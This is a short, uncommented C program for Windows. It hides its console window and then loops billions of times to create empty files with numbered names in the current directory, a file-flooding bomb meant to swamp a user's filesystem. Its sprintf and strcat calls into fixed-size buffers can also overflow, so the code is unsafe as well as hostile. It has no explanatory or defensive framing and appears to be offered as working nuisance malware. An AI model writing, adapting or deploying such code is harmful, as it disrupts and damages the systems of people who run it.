#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif
#include <Windows.h>
#include <stdio.h>
#include <string.h>
#define TEMP 4294967295
int main()
{
	FreeConsole();
	int temp_a, temp_b ,temp_c;
	char temp1[11], temp2[22], temp3[33];
	Sleep(10);
	for (temp_a = 1; temp_a<TEMP; temp_a++) {
		sprintf(temp1, "%d", temp_a);
		strcat(temp1, ".bin");
		fclose(fopen(temp1, "wb"));
	}
	for (temp_b = 1; temp_b<TEMP; temp_b++) {
		sprintf(temp2, "%d", temp_b);
		strcat(temp2,temp1);
		fclose(fopen(temp2, "wb"));
	}
	for (temp_c = 1; temp_c<TEMP; temp_c++) {
		sprintf(temp3, "%d", temp_c);
		strcat(temp3, temp2);
		fclose(fopen(temp3, "wb"));
	}
}
